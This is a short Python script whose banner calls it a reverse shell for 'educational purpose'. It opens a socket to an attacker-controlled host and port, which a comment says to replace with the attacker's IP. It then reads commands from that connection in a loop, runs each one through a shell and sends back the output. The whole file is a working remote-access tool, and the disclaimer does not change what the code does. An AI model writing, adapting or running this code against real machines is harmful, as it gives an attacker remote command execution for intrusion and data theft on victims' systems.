
################################################################################
##                                                                            ##
##             Author: MAhmutAY   <mahmutayy@gmail.com>                       ##
##                This is a ReverseShell script                               ##
##                                                                            ##
##              This is only educational purpose usage                        ##
##  !!  Do not attempt to violate the laws with anything contained here. !!!  ##
################################################################################

import subprocess
import socket

# Pleaase change The IP aress and port for listening Server ( Attacker device's IP and port in this situation)
HOST = '127.0.0.1'          
PORT = 8081

def give_The_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    while True:
        command = s.recv(1024).decode()
        
        if command.lower() == 'exit':
            break
        
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        s.send(result.stdout.encode() + result.stderr.encode())
    
    s.close()

if __name__ == "__main__":
    give_The_shell()
